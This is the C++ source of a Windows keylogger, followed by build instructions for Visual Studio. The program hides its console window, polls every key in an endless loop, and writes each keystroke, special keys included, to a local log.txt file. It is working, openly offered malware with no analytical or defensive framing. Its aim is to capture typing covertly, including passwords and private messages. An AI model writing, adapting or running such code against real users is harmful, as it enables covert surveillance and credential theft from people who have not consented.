#include <iostream>
#include <windows.h>
using namespace std;

void Save(int key, const char* file); // declaring function with parameters (ASCII of keys, file name)

int main() {

    ShowWindow(GetConsoleWindow(), SW_HIDE);
    // hides the console

    FILE* OUTPUT_FILE; // declaring file pointer
    OUTPUT_FILE = fopen("log.txt", "w+"); //w+ is used to overwrite
    fprintf(OUTPUT_FILE, ""); // to empty the file
    fclose(OUTPUT_FILE); // closing the file

    char i;
    while (true) { // infinite loop
        Sleep(10); // adds a delay to save CPU usage
        for (i = 8; i <= 255; i++) { // loops in all possible key stroks 
            if (GetAsyncKeyState(i) == -32767) Save(i, "log.txt");
        } // to chech if the key is pressed.   ||   saves the last pressed key in the file.
    } // -32767 is the return value of the GetAsyncKeyState() function when the key is last pressed
    
    return 0;
}

void Save(int key, const char* file) {

    Sleep(10);
    FILE* OUTPUT_FILE; // declaring file pointer
    OUTPUT_FILE = fopen(file, "a+"); //a+ is used to add new keys each time, to not overwrite
    switch (key) // to make special keys readable
    {
    case VK_SHIFT: fprintf(OUTPUT_FILE, "[SHIFT]");
        break;
    case VK_BACK: fprintf(OUTPUT_FILE, "[BACKSPACE]");
        break;
    case VK_LBUTTON: fprintf(OUTPUT_FILE, "[LBUTTON]");
        break;
    case VK_RBUTTON: fprintf(OUTPUT_FILE, "[RBUTTON]");
        break;
    case VK_RETURN: fprintf(OUTPUT_FILE, "[ENTER]");
        break;
    case VK_TAB: fprintf(OUTPUT_FILE, "[TAB]");
        break;
    case VK_ESCAPE: fprintf(OUTPUT_FILE, "[ESCAPE]");
        break;
    case VK_CONTROL: fprintf(OUTPUT_FILE, "[Ctrl]");
        break;
    case VK_MENU: fprintf(OUTPUT_FILE, "[Alt]");
        break;
    case VK_CAPITAL: fprintf(OUTPUT_FILE, "[CAPS Lock]");
        break;
    case VK_SPACE: fprintf(OUTPUT_FILE, "[SPACE]"); // can be wriiter as " "
        break;
    default:
        if (key >= 32 && key <= 126) fprintf(OUTPUT_FILE, "%c", key); // saves normal keys to the file
        else fprintf(OUTPUT_FILE, "[UNKNOWN]"); // ignores non-printable keys
    }
    fclose(OUTPUT_FILE);
    
}


/* -Hover on Project in the toolbar
-Press on "keylogger properties"
-Expand the C/C++ menu
-Preprocessors 
-Change processor definitions to the following:

_CRT_SECURE_NO_WARNINGS;_DEBUG;WIN32_CONSOLE;%(PreprocessorDefinitions) */